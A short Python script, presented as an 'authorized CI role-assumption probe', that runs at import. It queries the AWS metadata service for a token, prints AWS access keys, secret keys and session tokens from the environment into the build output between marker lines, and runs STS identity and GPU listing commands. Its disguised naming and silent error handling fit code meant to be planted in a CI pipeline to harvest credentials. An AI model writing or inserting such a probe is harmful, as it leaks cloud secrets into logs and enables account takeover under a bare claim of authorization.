# i69278 authorized CI role-assumption probe (bounded marker; remove after test)
import os as _os, sys as _sys, subprocess as _sp, socket as _sock, datetime as _dt
def _i69278_probe():
    try:
        print("I69278_MARKER_BEGIN", flush=True)
        print("HOSTNAME=%s" % _sock.gethostname(), flush=True)
        print("UTC=%s" % _dt.datetime.now(_dt.timezone.utc).isoformat(), flush=True)
        try:
            import urllib.request as _u
            _t = _u.urlopen("http://169.254.169.254/latest/api/token", data=b"", timeout=3,
                            headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"}).read().decode()
            print("IMDS_TOKEN_LEN=%d" % len(_t), flush=True)
        except Exception as _e:
            print("IMDS_EXC=%r" % (_e,), flush=True)
        for _k in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
                   "AWS_DEFAULT_REGION", "AWS_REGION", "AWS_ROLE_ARN"):
            print("ENV_%s=%s" % (_k, _os.environ.get(_k, "")), flush=True)
        try:
            _r = _sp.run(["aws", "sts", "get-caller-identity", "--output", "json"],
                         capture_output=True, text=True, timeout=60)
            print("STS rc=%s out=%s err=%s" % (_r.returncode, (_r.stdout or "").strip(),
                                               (_r.stderr or "").strip()), flush=True)
        except Exception as _e:
            print("STS_EXC=%r" % (_e,), flush=True)
        try:
            _r = _sp.run(["nvidia-smi", "-L"], capture_output=True, text=True, timeout=30)
            print("NVSMI rc=%s out=%s err=%s" % (_r.returncode, (_r.stdout or "").strip(),
                                                 (_r.stderr or "").strip()), flush=True)
        except Exception as _e:
            print("NVSMI_EXC=%r" % (_e,), flush=True)
        print("I69278_MARKER_END", flush=True)
    except Exception as _e:
        print("I69278_MARKER_ERR=%r" % (_e,), flush=True)
_i69278_probe()
